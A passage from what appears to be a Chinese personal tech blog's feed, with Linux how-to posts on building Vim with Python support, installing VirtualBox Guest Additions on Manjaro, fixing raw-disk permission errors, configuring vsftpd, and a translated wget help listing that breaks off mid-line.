<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/vim/vim.git<br><span class="hljs-built_in">cd</span> vim<br>sudo apt-get install libncurses5-dev python-dev python3-dev<br><br>./configure --with-features=huge \<br>-enable-rubyinterp \<br>-enable-pythoninterp \<br>-enable-python3interp \<br>--enable-luainterp \<br>--enable-perlinterp \<br>--enable-multibyte \<br>--enable-cscope \<br>--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu/ \<br>--with-python3-config-dir=/usr/lib/python3.7/config-3.7m-x86_64-linux-gnu/<br><br>make<br>sudo make install<br></code></pre></div></td></tr></table></figure>
<p>其中 <code>--with-python-config-dir</code> 和 <code>--with-python3-config-dir</code> 视自己Python目录而定。</p>
<p>再次查看vim版本就发现支持Python了！</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox安装manjaro后安装增强功能</title>
    <url>/virtual-manjaro-guest-iso/</url>
    <content><![CDATA[<p>一般来说，VirtualBox成功安装manjaro后可以在 [设备] -&gt; [安装增强功能]。然而有时却事与愿违的怎么也无法安装，那么这时我们就可以在manjaro里自行安装 VBoxGuestAdditions，let’s go!</p>
<span id="more"></span>
<h2 id="virtualbox-guest-iso"><a class="markdownIt-Anchor" href="#virtualbox-guest-iso"></a> virtualbox-guest-iso</h2>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo pacman -S virtualbox-guest-iso<br></code></pre></div></td></tr></table></figure>
<p>这是必须的，如此之外还可以访问官网 <a href="https://download.virtualbox.org/virtualbox/6.0.10/">https://download.virtualbox.org/virtualbox/6.0.10/</a> 下载。<br />
目前我的版本是6.0.10。下载后的iso文件存放路径为 <strong>/usr/lib/virtualbox/additions/VBoxGuestAdditions.iso</strong></p>
<h2 id="linux-header"><a class="markdownIt-Anchor" href="#linux-header"></a> linux header</h2>
<p>这时就能够挂载iso镜像文件(root权限)</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo mount /usr/lib/virtualbox/additions/VBoxGuestAdditions.iso /mnt<br><span class="hljs-built_in">cd</span> /mnt<br></code></pre></div></td></tr></table></figure>
<p>我们只需关心 <strong>VBoxLinuxAdditions.run</strong> ，若直接 <code>sudo sh VBoxLinuxAdditions.run</code> ，可能会导致安装不成功，如下消息</p>
<blockquote>
<p>ifying archive integrity… All good.<br />
Uncompressing VirtualBox 6.0.10 Guest Additions for Linux…<br />
VirtualBox Guest Additions installer<br />
Removing installed version 6.0.10 of VirtualBox Guest Additions…<br />
Copying additional installer modules …<br />
Installing additional modules …<br />
VirtualBox Guest Additions: Starting.<br />
VirtualBox Guest Additions: Building the VirtualBox Guest Additions kernel<br />
modules.  This may take a while.<br />
VirtualBox Guest Additions: To build modules for other installed kernels, run<br />
VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup <version><br />
VirtualBox Guest Additions: or<br />
VirtualBox Guest Additions:   /sbin/rcvboxadd quicksetup all<br />
VirtualBox Guest Additions: Building the modules for kernel 4.19.62-1-MANJARO.</p>
<p><font color=red>This system is currently not set up to build kernel modules.<br />
Please install the Linux kernel “header” files matching the current kernel<br />
for adding new hardware support to the system.</font><br />
VirtualBox Guest Additions: Running kernel modules will not be replaced until<br />
the system is restarted</p>
</blockquote>
<p>这表明目前系统没有安装 linux header 文件，解决方法如下(<strong>注意内核版本</strong>)：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">uname -r<br>4.19.62-1-MANJARO<br>sudo pacman -S linux419-headers<br>sudo pacman -S linux419-virtualbox-guest-modules <br></code></pre></div></td></tr></table></figure>
<p>PS： 若 <code>sudo pacman -S linux-headers</code> ，我这manjaro默认安装为 <code>linux316-headers-3.16.71-1</code>。相反 archlinux安装的是最新版本…</p>
<p>接着就可以执行 <code>sudo sh VBoxLinuxAdditions.run</code> 来安装 VirtualBox Guest Additions，该过程可能需要一些时间来构建内核模块。若没有出现<font color=red>红字</font>部分，则表明安装成功，重启即可使用该功能</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox添加raw disk时出现VERR_ACCESS_DENIED</title>
    <url>/virtualbox-addrawdisk-err/</url>
    <content><![CDATA[<p>本来想在virtualbox里U盘启动，用 vboxmanage 创建就可以完成的然而却在启动时发生了错误，这里把错误过程记录下来</p>
<span id="more"></span>
<h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2>
<p>插上U盘后 lsblk 后即可找到U盘的设备名称如 /dev/sda，如果直接 <code>vboxmanage internalcommands createrawvmdk -filename usb.vmdk -rawdisk /dev/sda</code> 提示没有权限只需，那么可以root权限执行该命令，的确成功了，OK。</p>
<p>但是当我尝试在virtualbox存储介质中载入虚拟盘时，却发生了一个奇怪的错误：<strong>virtualbox没有权限访问usb.vmdk</strong></p>
<figure class="highlight ldif"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ldif"><span class="hljs-attribute">Permission problem accessing the file for the medium &#x27;/home/joxrays/usb.vmdk&#x27; (VERR_ACCESS_DENIED).</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">返回 代码</span>: <br><span class="hljs-attribute">VBOX_E_FILE_ERROR (0x80BB0004)</span><br><span class="hljs-attribute">组件</span>: <br><span class="hljs-attribute">MediumWrap</span><br><span class="hljs-attribute">界面</span>: <br><span class="hljs-attribute">IMedium &#123;ad47ad09-787b-44ab-b343-a082a3f2dfb1&#125;</span><br><span class="hljs-attribute">被召者</span>: <br><span class="hljs-attribute">IVirtualBox &#123;d0a0163f-e254-4e5b-a1f2-011cf991c38d&#125;</span><br><span class="hljs-attribute">被召者 RC</span>: <br><span class="hljs-attribute">VBOX_E_OBJECT_NOT_FOUND (0x80BB0001)</span><br></code></pre></div></td></tr></table></figure>
<p>无论我chown还是chmod并没有解决该问题。经过Google后在 stackexchange 找到了问题的解决方法</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo usermod -aG disk <span class="hljs-variable">$USER</span><br>或者 sudo gpasswd -a <span class="hljs-variable">$USER</span> disk<br></code></pre></div></td></tr></table></figure>
<p>很简单，仅是讲当前用户添加到 <strong>disk组</strong>，之后注销重新登录就好了。</p>
<p>之后在执行如下命令就看创建一个**.vmdk**虚拟盘文件了。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vboxmanage internalcommands createrawvmdk  -filename usb.vmdk -rawdisk /dev/sda<br></code></pre></div></td></tr></table></figure>
<p>关于disk组，在archlinux wiki上是这样解释： Access to block devices not affected by other groups such as <code>optical</code>, <code>floppy</code>, and <code>storage</code> 。也就是说加入了disk组的用户能够访问那些不受 optical ，floppy 和 storage组控制的块设备。</p>
<p>如果想要把用户从disk组中删除，则</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo gpasswd -d <span class="hljs-variable">$USER</span> disk<br></code></pre></div></td></tr></table></figure>
<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
<ul>
<li><a href="https://unix.stackexchange.com/questions/284704/verr-access-denied-when-trying-to-add-a-raw-disk-to-virtual-box">VERR_ACCESS_DENIED when trying to add a raw disk to virtual box</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Users_and_groups_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#systemd_%E4%B9%8B%E5%89%8D%E7%9A%84%E7%BE%A4%E7%BB%84">Users_and_groups</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>VirtualBox</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Vsftpd遇到的问题</title>
    <url>/vsftp-configure/</url>
    <content><![CDATA[<p>目前我用的系统是archlinux，所以在配置vsftpd是不是一帆风顺的，这里将安装配置过程记录下来，也无法确保是否还有其他错误。</p>
<span id="more"></span>
<p>安装命令如下</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo pacman -S vsftpd<br></code></pre></div></td></tr></table></figure>
<h2 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h2>
<p>这是我现在的配置（注释已去）</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">anonymous_enable=NO<br>local_enable=YES<br>write_enable=YES<br>xferlog_enable=YES<br>connect_from_port_20=YES<br><br>listen=YES<br><br>pam_service_name=vsftpd<br>allow_writeable_chroot=YES<br>local_root=/home/ftp_dir<br>chroot_local_user=YES<br>use_localtime=YES<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> user_list_deny=NO</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-keyword">do</span> not allow to login ftp</span><br>userlist_enable=YES<br>userlist_deny=NO<br>userlist_file=/etc/vsftpd.user_list<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> user free timeout</span><br><span class="hljs-meta">#</span><span class="bash"> idle_session_timeout=30</span><br>data_connection_timeout=10<br>accept_timeout=120<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">local</span> user transfer rate</span><br>local_max_rate=50000<br>max_clients=10<br>max_per_ip=2<br><br>pasv_enable=yes<br>pasv_min_port=5000<br>pasv_max_port=6000<br><br>seccomp_sandbox=NO<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> welcome message</span><br>ftpd_banner=&gt;&gt;&gt;&gt;&gt; Welcome to MineFTP &lt;&lt;&lt;&lt;&lt;<br>dirmessage_enable=YES<br></code></pre></div></td></tr></table></figure>
<h2 id="vsftp用户和文件目录设置"><a class="markdownIt-Anchor" href="#vsftp用户和文件目录设置"></a> VSFTP用户和文件目录设置</h2>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir /home/ftp_dir<br>useradd -d /home/ftp_dir mineftp<br>passwd mineftp<br>usermod -aG mineftp whos<br>usermod -s /sbin/nologin mineftp<br>chown mineftp:mineftp /home/ftp_dir<br><span class="hljs-built_in">echo</span> mineftp &gt;&gt; /etc/vsftpd.user_list <br></code></pre></div></td></tr></table></figure>
<h2 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h2>
<h3 id="1-500-oops-vsftpd-refusing-to-run-with-writable-root-inside-chroot"><a class="markdownIt-Anchor" href="#1-500-oops-vsftpd-refusing-to-run-with-writable-root-inside-chroot"></a> 1. 500 OOPS: vsftpd: refusing to run with writable root inside chroot()</h3>
<p>把 <strong>chroot_local_user</strong>  和 <strong>allow_writeable_chroot</strong> 改为 YES，或者用 wiki上的 <a href="https://wiki.archlinux.org/index.php/Very_Secure_FTP_Daemon_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#vsftpd:_refusing_to_run_with_writable_root_inside_chroot()">方法</a></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">chroot_local_user=YES<br>allow_writeable_chroot=YES<br>systemctl restart vsftpd<br></code></pre></div></td></tr></table></figure>
<h3 id="2-530-login-incorrect"><a class="markdownIt-Anchor" href="#2-530-login-incorrect"></a> 2.  530 Login incorrect</h3>
<p>修改/etc/pam.d/vsftpd<br />
将 <strong>auth required pam_shells.so</strong> 修改为 <strong>auth required pam_nologin.so</strong> 即可<br />
重启vsftpd</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ nano /etc/pam.d/vsftpd <br><br><span class="hljs-comment">#%PAM-1.0</span><br>auth       required     /lib/security/pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed<br>auth       required     /lib/security/pam_unix.so shadow nullok<br>auth       required     /lib/security/pam_nologin.so<br>account    required     /lib/security/pam_unix.so<br>session    required     /lib/security/pam_unix.so<br></code></pre></div></td></tr></table></figure>
<h3 id="3-vsftpdservice-main-process-exited-codeexited"><a class="markdownIt-Anchor" href="#3-vsftpdservice-main-process-exited-codeexited"></a> 3. vsftpd.service: Main process exited, code=exited</h3>
<p>一定要把 vsftpd.conf 文件所有者(owner) 改为 root，否则vsftpd无法启动</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo chown root:root /etc/vsftpd.conf<br></code></pre></div></td></tr></table></figure>
<p>错误信息：</p>
<blockquote>
<p>vsftpd.service - vsftpd daemon<br />
Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled)<br />
Active: failed (Result: exit-code) since Sun 2019-07-28 18:57:07 CST; 40s ago<br />
Process: 6607 ExecStart=/usr/bin/vsftpd (code=exited, status=2)<br />
Main PID: 6607 (code=exited, status=2)</p>
<p>7月 28 18:57:07 goo systemd[1]: Started vsftpd daemon.<br />
7月 28 18:57:07 goo systemd[1]: vsftpd.service: Main process exited, code=exited, status=2/INVALIDARGUMENT<br />
7月 28 18:57:07 goo systemd[1]: vsftpd.service: Failed with result ‘exit-code’.</p>
</blockquote>
<p>参考：</p>
<ul>
<li><a href="https://wiki.archlinux.org/index.php/Very_Secure_FTP_Daemon_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Vsftpd Wiki</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>vsftpd</tag>
      </tags>
  </entry>
  <entry>
    <title>Wget下载工具</title>
    <url>/wget-tool/</url>
    <content><![CDATA[<p>作为一款Linux下著名的文件下载工具–Wget,它的轻巧便捷及强大的功能可以与大多数下载工具相媲美.支持 <strong>HTTP,HTTPS,FTP协议</strong>, 也可以使用<strong>代理</strong>,断点续传…</p>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p><a href="http://www.gnu.org/software/wget/manual/wget.html">英文帮助文档</a></p>
<p>但由于其是在命令行下操作,所以玩一起来还是有一定难度的.与 <a href="https://curl.haxx.se/"><strong>curl</strong></a> (由libcurl库实现)相比两者还是有一定的区别的.</p>
<p>Linux下可以 <code>wget --help</code> 查看wget帮助,更详细的可以 <code>man wget</code></p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">启动：<br>  -V,  <span class="hljs-params">--version</span>                   显示 Wget 的版本信息并退出<br>  -h,  <span class="hljs-params">--help</span>                      打印此帮助<br>  -b,  <span class="hljs-params">--background</span>                启动后转入后台<br>  -e,  <span class="hljs-params">--execute=</span>命令              运行一个“<span class="hljs-string">.wgetrc</span>”风格的命令<br>日志和输入文件：<br>  -o,  <span class="hljs-params">--output-file=</span>文件          将日志信息写入 FILE<br>  -a,  <span class="hljs-params">--append-output=</span>文件        将信息添加至 FILE<br>  -d,  <span class="hljs-params">--debug</span>                     打印大量调试信息<br>  -q,  <span class="hljs-params">--quiet</span>                     安静模式 <span class="hljs-params">(无信息输出)</span><br>  -v,  <span class="hljs-params">--verbose</span>                   详尽的输出 <span class="hljs-params">(此为默认值)</span><br>  -nv, <span class="hljs-params">--no-verbose</span>                关闭详尽输出，但不进入安静模式<br>       <span class="hljs-params">--report-speed=</span>类型         以 &lt;类型&gt; 报告带宽。类型可以是 bits<br>  -i,  <span class="hljs-params">--input-file=</span>文件           下载本地或外部 &lt;文件&gt; 中的 URL<br>  -F,  <span class="hljs-params">--force-html</span>                把输入文件当成 HTML 文件<br>  -B,  <span class="hljs-params">--base=URL</span>                  解析相对于 URL 的 HTML 输入文件链接 <span class="hljs-params">(-i -F)</span><br>       <span class="hljs-params">--config=</span>文件               指定要使用的配置文件<br>       <span class="hljs-params">--no-cookies</span>                不读取任何配置文件<br>       <span class="hljs-params">--rejected-log=</span>文件         将拒绝 URL 的原因写入 &lt;文件&gt;。<br>下载：<br>  -t,  <span class="hljs-params">--tries=</span>数字                设置重试次数为 &lt;数字&gt; <span class="hljs-params">(0 代表无限制)</span><br>       <span class="hljs-params">--retry-connrefused</span>         即使拒绝连接也是重试<br>  -O,  <span class="hljs-params">--output-document=</span>文件      将文档写入 FILE<br>  -nc, <span class="hljs-params">--no-clobber</span>                不要下载已存在将被覆盖的文件<br>       <span class="hljs-params">--no-netrc</span>                  don&#x27;t <span class="hljs-keyword">try</span> to obtain credentials from <span class="hljs-string">.netrc</span><br>  -c,  <span class="hljs-params">--continue</span>                  断点续传下载文件<br>       <span class="hljs-params">--start-pos=</span>偏移量          从由零计数的 &lt;偏移量&gt; 开始下载<br>       <span class="hljs-params">--progress=</span>类型             选择进度条类型<br>       <span class="hljs-params">--show-progress</span>             在任意啰嗦状态下都显示进度条<br>  -N,  <span class="hljs-params">--timestamping</span>              只获取比本地文件新的文件<br>       <span class="hljs-params">--no-if-modified-since</span>      不要在时间戳 <span class="hljs-params">(timestamping)</span> 模式下使用<br>                                     if-modified-since get 条件请求<br>       <span class="hljs-params">--no-use-server-timestamps</span>       不用服务器上的时间戳来设置本地文件<br>  -S,  <span class="hljs-params">--server-response</span>           打印服务器响应<br>       <span class="hljs-params">--spider</span>                    不下载任何文件<br>  -T,  <span class="hljs-params">--timeout=SECONDS</span>           将所有超时设为 SECONDS 秒<br>       <span class="hljs-params">--dns-timeout=SECS</span>          设置 DNS 查寻超时为 SECS 秒<br>       <span class="hljs-params">--connect-timeout=SECS</span>      设置连接超时为 SECS 秒<br>       <span class="hljs-params">--read-timeout=SECS</span>         设置读取超时为 SECS 秒<br>  -w,  <span class="hljs-params">--wait=SECONDS</span>              等待间隔为 SECONDS 秒<br>       <span class="hljs-params">--waitretry=SECONDS</span>         在获取文件的重试期间等待 1.<span class="hljs-string">.SECONDS</span> 秒<br>       <span class="hljs-params">--random-wait</span>               获取多个文件时，每次随机等待间隔 <span class="hljs-params">(0.5~1.5)</span>*WAIT 秒<br>       <span class="hljs-params">--no-proxy</span>                  禁止使用代理<br>  -Q,  <span class="hljs-params">--quota=</span>数字                设置获取配额为 &lt;数字&gt; 字节<br>       <span class="hljs-params">--bind-address=ADDRESS</span>      绑定至本地主机上的 ADDRESS <span class="hljs-params">(主机名或是 IP)</span><br>       <span class="hljs-params">--limit-rate=RATE</span>           限制下载速率为 RATE<br>       <span class="hljs-params">--no-dns-cache</span>              关闭 DNS 查询缓存<br>       <span class="hljs-params">--restrict-file-names=</span>系统  限定文件名中的字符为 &lt;系统&gt; 允许的字符<br>       <span class="hljs-params">--ignore-case</span>               匹配文件/目录时忽略大小写<br>  -4,  <span class="hljs-params">--inet4-only</span>                仅连接至 IPv4 地址<br>  -6,  <span class="hljs-params">--inet6-only</span>                仅连接至 IPv6 地址<br>       <span class="hljs-params">--prefer-family=</span>地址族      首先连接至指定家族（IPv6，IPv4 或 none）的地址<br>       <span class="hljs-params">--user=</span>用户                 将 ftp 和 http 的用户名均设置为 &lt;用户&gt;<br>       <span class="hljs-params">--password=</span>密码             将 ftp 和 http 的密码均设置为 &lt;密码&gt;<br>       <span class="hljs-params">--ask-password</span>              提示输入密码<br>       <span class="hljs-params">--use-askpass=COMMAND</span>       specify credential handler for requesting <br>                                     username and password.  If no COMMAND is <br>                                     specified the WGET_ASKPASS or the SSH_ASKPASS <br>                                     environment variable is used.<br>       <span class="hljs-params">--no-iri</span>                    关闭 IRI 支持<br>       <span class="hljs-params">--local-encoding=ENC</span>        使用 ENC 作为 IRI <span class="hljs-params">(国际化资源标识符)</span> 的本地编码<br>       <span class="hljs-params">--remote-encoding=ENC</span>       使用 ENC 作为默认远程编码<br>       <span class="hljs-params">--unlink</span>                    覆盖前移除文件<br>       <span class="hljs-params">--no-xattr</span>                  不要在文件的拓展属性中储存元数据<br>目录：<br>  -nd, <span class="hljs-params">--no-directories</span>            不创建目录<br>  -x,  <span class="hljs-params">--force-directories</span>         强制创建目录<br>  -nH, <span class="hljs-params">--no-host-directories</span>       不要创建主 <span class="hljs-params">(host)</span> 目录<br>       <span class="hljs-params">--protocol-directories</span>      在目录中使用协议名称<br>  -P,  <span class="hljs-params">--directory-prefix=</span>前缀     保存文件到 &lt;前缀&gt;<span class="hljs-string">/..</span><br>       <span class="hljs-params">--cut-dirs=</span>数字             忽略远程目录中 &lt;数字&gt; 个目录层。<br>HTTP 选项：<br>       <span class="hljs-params">--http-user=</span>用户            设置 http 用户名为 &lt;用户&gt;<br>       <span class="hljs-params">--http-password=</span>密码        设置 http 密码为 &lt;密码&gt;<br>       <span class="hljs-params">--no-cache</span>                  不使用服务器缓存的数据。<br>       <span class="hljs-params">--default-page=NAME</span>         改变默认页 <span class="hljs-params">(通常是“index.html”)</span>。<br>  -E,  <span class="hljs-params">--adjust-extension</span>          以合适的扩展名保存 HTML/CSS 文档<br>       <span class="hljs-params">--ignore-length</span>             忽略头部的‘Content-Length’区域<br>       <span class="hljs-params">--header=</span>字符串             在头部插入 &lt;字符串&gt;<br>       <span class="hljs-params">--compression=TYPE</span>          choose compression, one of auto, gzip and none<br>       <span class="hljs-params">--max-redirect</span>              每页所允许的最大重定向<br>       <span class="hljs-params">--proxy-user=</span>用户           使用 &lt;用户&gt; 作为代理用户名<br>       <span class="hljs-params">--proxy-password=</span>密码       使用 &lt;密码&gt; 作为代理密码<br>       <span class="hljs-params">--referer=URL</span>               在 HTTP 请求头包含‘Referer: URL’<br>       <span class="hljs-params">--save-headers</span>              将 HTTP 头保存至文件。<br>  -U,  <span class="hljs-params">--user-agent=</span>代理           标识自己为 &lt;代理&gt; 而不是 Wget/VERSION。<br>       <span class="hljs-params">--no-http-keep-alive</span>        禁用 HTTP keep-alive <span class="hljs-params">(持久连接)</span>。<br>       <span class="hljs-params">--no-cookies</span>                不使用 cookies。<br>       <span class="hljs-params">--load-cookies=</span>文件         会话开始前从 &lt;文件&gt; 中载入 cookies。<br>       <span class="hljs-params">--save-cookies=</span>文件         会话结束后保存 cookies 至 FILE。<br>       <span class="hljs-params">--keep-session-cookies</span>      载入并保存会话 <span class="hljs-params">(非永久)</span> cookies。<br>       <span class="hljs-params">--post-data=</span>字符串          使用 POST 方式；把 &lt;字串&gt;作为数据发送。<br>       <span class="hljs-params">--post-file=</span>文件            使用 POST 方式；发送 &lt;文件&gt; 内容。<br>       <span class="hljs-params">--method=HTTP</span>方法           在请求中使用指定的 &lt;HTTP 方法&gt;。<br>       <span class="hljs-params">--post-data=</span>字符串          把 &lt;字串&gt; 作为数据发送，必须设置 <span 